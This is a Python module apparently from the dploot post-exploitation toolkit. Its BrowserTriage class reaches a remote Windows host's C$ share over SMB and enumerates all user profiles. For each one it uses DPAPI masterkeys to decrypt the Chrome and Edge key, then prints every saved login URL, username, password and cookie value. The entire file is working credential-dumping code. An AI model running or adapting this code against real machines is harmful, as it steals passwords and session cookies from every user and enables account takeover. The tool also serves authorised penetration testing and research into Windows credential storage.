import base64
import json
import logging
import ntpath
import tempfile
import sqlite3
from typing import List
from dploot.lib.crypto import decrypt_chrome_password

from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.lib.utils import datetime_to_time

class BrowserTriage:

    false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']
    user_google_chrome_generic_login_path = {
        'aesStateKeyPath':'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State',
        'loginDataPath':'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
        'cookiesDataPath':'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'
    }
    user_msedge_generic_login_path = {
        'aesStateKeyPath':'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State',
        'loginDataPath':'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data',
        'cookiesDataPath':'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies'
    }
    user_generic_chrome_paths = {
        'google chrome':user_google_chrome_generic_login_path,
        'msedge':user_msedge_generic_login_path,
    }

    share = 'C$'

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list) -> None:
        self.target = target
        self.conn = conn
        
        self._is_admin = None
        self._users = None
        self.looted_files = dict()
        self.masterkeys = masterkeys

    def triage_browsers(self) -> None:
        logging.info('Triage Browser Credentials and Cookies for ALL USERS')
        for user in self.users:
            try:
                self.triage_browsers_for_user(user)
            except Exception as e:
                print(str(e))
                pass
        print()

    def triage_browsers_for_user(self, user: str) -> None:
        self.triage_chrome_browsers_for_user(user=user)

    def triage_chrome_browsers_for_user(self,user:str) -> None:
        for browser,paths in self.user_generic_chrome_paths.items():
            aeskey = None
            aesStateKey_bytes = self.conn.readFile(shareName=self.share, path=paths['aesStateKeyPath'] % user)
            if aesStateKey_bytes is not None and len(aesStateKey_bytes) > 0:
                logging.info('Found %s AppData files for user %s' % (browser.upper(), user))
                aesStateKey_json = json.loads(aesStateKey_bytes)
                blob = base64.b64decode(aesStateKey_json['os_crypt']['encrypted_key'])
                if blob[:5] == b'DPAPI':
                    dpapi_blob = blob[5:]
                    masterkey = find_masterkey_for_blob(dpapi_blob, masterkeys=self.masterkeys)
                    if masterkey is not None:
                        aeskey = decrypt_blob(blob_bytes=dpapi_blob, masterkey=masterkey)

            loginData_bytes = self.conn.readFile(shareName=self.share, path=paths['loginDataPath'] % user)
            if aeskey is not None and loginData_bytes is not None and len(loginData_bytes) > 0:
                fh = tempfile.NamedTemporaryFile()
                fh.write(loginData_bytes)
                fh.seek(0)
                db = sqlite3.connect(fh.name)
                cursor = db.cursor()
                query = cursor.execute(
                    'SELECT action_url, username_value, password_value FROM logins')
                lines = query.fetchall()
                if len(lines) > 0:
                    for url, username, encrypted_password in lines:
                        password = decrypt_chrome_password(encrypted_password, aeskey)
                        print('[%s LOGIN DATA]' % browser.upper())
                        print('URL:\t\t%s' % url)
                        print('Username:\t%s' % username)
                        if password is not None:
                            print('Password:\t%s' % password)
                        print()
                fh.close()


            cookiesData_bytes = self.conn.readFile(shareName=self.share, path=paths['cookiesDataPath'] % user)
            if aeskey is not None and cookiesData_bytes is not None and len(cookiesData_bytes) > 0:
                fh = tempfile.NamedTemporaryFile()
                fh.write(cookiesData_bytes)
                fh.seek(0)
                db = sqlite3.connect(fh.name)
                cursor = db.cursor()
                query = cursor.execute(
                    'SELECT creation_utc, host_key, name, path, expires_utc, last_access_utc, encrypted_value FROM cookies')
                lines = query.fetchall()
                if len(lines) > 0:
                    for creation_utc, host, name, path, expires_utc, last_access_utc, encrypted_cookie in lines:
                        cookie = decrypt_chrome_password(encrypted_cookie, aeskey)
                        print('[%s COOKIE DATA]' % browser.upper())
                        print('Host (path):\t\t%s (%s)' % (host,path))
                        print('Cookie Name:\t\t%s' % name)
                        if cookie is not None:
                            print('Cookie Value:\t\t%s' % cookie)
                        print('Creation UTC:\t\t%s' % datetime_to_time(creation_utc))
                        print('Expires UTC:\t\t%s' % datetime_to_time(expires_utc))
                        print('Last Access UTC:\t%s' % datetime_to_time(last_access_utc))
                        print()
                fh.close()

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin

    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users
        
        users = list()

        users_dir_path = 'Users\\*'
        directories = self.conn.listPath(shareName=self.share, path=ntpath.normpath(users_dir_path))
        for d in directories:
            if d.get_longname() not in self.false_positive and d.is_directory() > 0:
                users.append(d.get_longname())
    
        self._users = users

        return self._users